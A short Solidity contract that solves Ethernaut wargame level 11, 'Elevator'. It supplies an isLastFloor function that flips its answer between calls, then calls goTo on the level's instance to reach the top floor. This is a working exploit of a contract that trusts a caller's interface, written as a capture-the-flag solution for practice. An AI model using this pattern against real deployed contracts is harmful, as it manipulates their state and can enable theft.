// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 11. ELEVATOR
 * @dev This elevator won't let you reach the top of your building. Right?
 */

contract Ethernaut_Elevator {
    bool private toogle;
    address private elevator = 0xbEd2A62C26eC563e2499c4b9e47383995C6912B3; // Replace with your Elevator instance

    // Implement the isLastFloor function to return false the first time (set the floor to any uint value) and true the second time to go to the top
    function isLastFloor(uint) public returns (bool) {
        toogle = !toogle;
        return toogle;
    }

    function attack(uint256 _floor) external {
        Elevator(elevator).goTo(_floor);
    }
}

// 🎉 Level completed! 🎉
